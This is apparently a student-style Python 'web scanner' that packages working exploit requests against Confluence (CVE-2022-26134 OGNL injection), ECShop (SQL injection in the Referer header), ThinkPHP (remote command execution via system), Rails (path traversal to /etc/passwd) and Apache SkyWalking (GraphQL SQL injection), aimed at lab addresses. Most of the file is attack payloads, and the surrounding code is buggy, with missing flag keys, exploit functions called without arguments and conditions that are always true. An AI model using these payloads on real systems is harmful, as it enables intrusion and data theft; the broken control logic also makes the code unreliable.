from ctypes import sizeof
from math import fabs
from sqlite3 import SQLITE_ATTACH
from typing import Type
from wsgiref import headers
import requests

def exploit_confluence_CVE_2022_26134(URL):
    url1 = URL
    url1 += "{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(" + "id"").getInputStream()," + "utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(" + "X-Cmd-Response"",#a))}/"
    headers1 = { "HOST":"192.168.56.101:8090", 
                "Accept-Encoding":"gzip, deflate",
                "Accept":"*/*",
                "Accept-Language":"en",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
                "Connection":"close"}
    res1 = requests.get(url1, headers1)
    print(res1.headers)

def check_confluence_CVE_2022_26134(URL):
    url1 = URL
    res1 = requests.post(url1)
    if(res1.headers['x-confluence-request-time'] != 0):
        print('Code injection can be used')
        return True
    else:
        print('lol')

def exploit_ecshop(URL):
    url1 = URL + "/user.php?act=login"
    headers1 = {"Host":"192.168.56.101",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Cookie":"PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1",
                "Referer":"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:" + "num"+";s:107:"+"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"+";s:2:"+"id"+";s:11:"+"-1' UNION/*"+ ";}45ea207d7a2b68c49582d2d22adf953a",
                "Connection":"close",
                "Upgrade-Insecure-Requests":"1",
                "Cache-Control": "max-age=0"}
 
    res1 = requests.get(url1, headers1)
    print(res1.headers)
    if (res1.status_code == 200):
        print("vulnirability was abused")
    else:
        print("something went wrong")

def check_ecshop(URL):
    url1 = URL + "/user.php?act=login"
    headers1 = {"Host":"192.168.56.101",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Cookie":"PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1",
                "Referer":"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:" + "num"+";s:107:"+"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"+";s:2:"+"id"+";s:11:"+"-1' UNION/*"+ ";}45ea207d7a2b68c49582d2d22adf953a",
                "Connection":"close",
                "Upgrade-Insecure-Requests":"1",
                "Cache-Control": "max-age=0"}
 
    res1 = requests.get(url1, headers1)
    my_str = res1.headers['Set-Cookie'][:3]
    if (my_str == "ECS"):
        print("SQLi can be used")

def thinkphp_exploit_RCE(URL):
    url1 = URL 
    url1 += "/index.php?s=captcha"
    my_heads = {"Host":"localhost",
                "Accept-Encoding":"gzip, deflate",
                "Accept":"*/*",
                "Accept-Language":"en",
                "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                "Connection":"close",
                "Content-Type":"application/x-www-form-urlencoded",
                "Content-Length":"72"}
    my_params = {"_method":"_construct",
               "filter[]":"system",
               "method":"get",
               "server[REQUEST_METHOD]":"id"}
    req = requests.post(url1, my_params, my_heads)
    print(req.text)

    

def chech_thinkphp(URL):
    url1 = URL
    req = requests.get(url1)
    my_str = ""
    i = req.text.find('[') + 3
    my_str = req.text[i: i+5]
    print("Current version: ", my_str)
    if int(my_str[0]) <= 5 and int(my_str[2]) <= 0:
        print("RCE vulnerability found")

   
def exploit_Rails(URL):
    url1 = URL + "/robots"
    headers1 = {"Host":"192.168..56.101:3000",
                "Accept-Encoding":"gzip, deflate",
                "Accept":"../../../../../../../../etc/passwd{{",
                "Accept-Language":"en",
                "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                "Connection":"close"}
    req = requests.get(url1, headers1)
    print(req.text)

def exploit_SKYWALKING(URL):
    url1 = URL + "/graphql"
    headers1 = {"Host":"localhost:8080",
                "Accept-Encoding": "gzip, deflate",
                "Accept": "*/*",
                "Accept-Language": "en",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Connection":"close",
                "Content-Type": "application/json",
                "Content-Length": "336"}
    my_params = '{"query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) {total logs {serviceId serviceName isError content } }}","variables":{"condition":{"metricName":"sqli","state":"ALL", "paging":{"pageSize":10}}}}'
    req = requests.post(url1, headers1, my_params)
    print(req.text)

def check_SKYWALKING(URL):
    url1 = URL
    res1 = requests.get (url1)
    print(res1.headers)

def main():
    print("This is WEB scanner\nYou can write -h or --help to see what scanner can do")
    my_info = "-h  or --HELP  prints info\n\n"+"-sc or --SQLc  checks for SQLi\n\n"+"-se or --SQLe  exploits SQLi\n\n"+"-rc or --RCEc  chechs RCE\n\n"+"-re or --RCEe  exploits RCE\n\n"+"-f  or --FILE  gets URL from file\n\n"+"-u  or --URL   gets URL  straight\n\n"+"-t  or --PT    exploits Path Traversal\n\n"+"-o  or --OF    write output in file\n\n"+"-i  or --IF    to get URLs from file\n\n"+"-k  or --KILL  stops programm"


    flag = True;
    while(flag):
        my_task = input()
        my_flags = {'sc':0,
                    'se':0,
                    'rc':0,
                    're':0,
                    'f':0,
                    'i':0,
                    't':0,
                    'o':0}
        if my_task == "--HELP" or my_task == "-h":
            print(my_info)
            continue
        if my_task == "-KILL" or my_task == "-k":
            break
        my_mas = my_task.split(" ")
        for b in range (len(my_mas)):
            if my_mas[b][0] == '-':
                if my_mas[b][1:] == 'u' or my_mas[b][1:] == '-URL':
                    my_flags['u'] = b
                elif my_mas[b][1:] == 'sc' or my_mas[b][1:] == '-SQLc':
                        my_flags['sc'] = b
                elif my_mas[b][1:] == 'se' or my_mas[b][1:] == '-SQLe':
                    my_flags['se'] = b
                elif my_mas[b][1:] == 'rc' or my_mas[b][1:] == '-RCEc':
                    my_flags['rc'] = b
                elif my_mas[b][1:] == 're' or my_mas[b][1:] == '-RCEe':
                    my_flags['re'] = b
                elif my_mas[b][1:] == 'f' or my_mas[b][1:] == '-FILE':
                    my_flags['f'] = b
                elif my_mas[b][1:] == 'o' or my_mas[b][1:] == '-OF':
                    my_flags['o'] = b
                elif my_mas[b][1:] == 'i' or my_mas[b][1:] == '-IF':
                    my_flags['i'] = b
                elif my_mas[b][1:] == 't' or my_mas[b][1:] == '-PT':
                    my_flags['t'] = b







        if my_flags['o']:
            f_w = open(my_mas[my_flags['o'] - 1])
        if my_flags['i']:
            f_r = open(my_mas[my_flags['i'] - 1])
        if my_flags['u']:
            URL = my_mas[my_flags['u'] - 1]
        elif my_flags['sc']:
            if my_flags['i']:
                for URL in f_r:
                    if [my_flags["o"]]:
                        f_w.write(check_ecshop(URL))
                    else:
                        check_ecshop(URL)
            else:
                if [my_flags["o"]]:
                        f_w.write(check_ecshop(URL))
                else:
                        check_ecshop(URL)
        elif my_flags['se']:
            if my_flags['i']:
                for URL in f_r:
                    if [my_flags["o"]]:
                        f_w.write(exploit_SKYWALKING(URL))
                    else:
                        exploit_SKYWALKING(URL)
            else:
                if [my_flags["o"]]:
                    f_w.write(exploit_SKYWALKING(URL))
                else:
                    exploit_SKYWALKING(URL)
        elif my_flags['rc']:
            if my_flags['i']:
                for URL in f_r:
                    if [my_flags["o"]]:
                        f_w.write(chech_thinkphp(URL))
                    else:
                        chech_thinkphp(URL)
            else:
                if [my_flags["o"]]:
                        f_w.write(chech_thinkphp(URL))
                else:
                    chech_thinkphp(URL)
        elif my_flags['re']:
            if my_flags['i']:
                for URL in f_r:
                    if my_flags['o']:
                        f_w.write(exploit_confluence_CVE_2022_26134())
                    else:
                        exploit_confluence_CVE_2022_26134()
            else:
                if my_flags['o']:
                    f_w.write(exploit_confluence_CVE_2022_26134())
                else:
                    exploit_confluence_CVE_2022_26134()

        elif my_flags['t']:
            if my_flags['i']:
                for URL in f_r:
                    if my_flags['o']:
                        f_w.write(exploit_Rails())
                    else:
                        print(exploit_Rails())
            else:
                if my_flags['o']:
                     f_w.write(exploit_Rails(URL))
                else:
                    exploit_Rails(URL)


if __name__ == "__main__":
    main() 

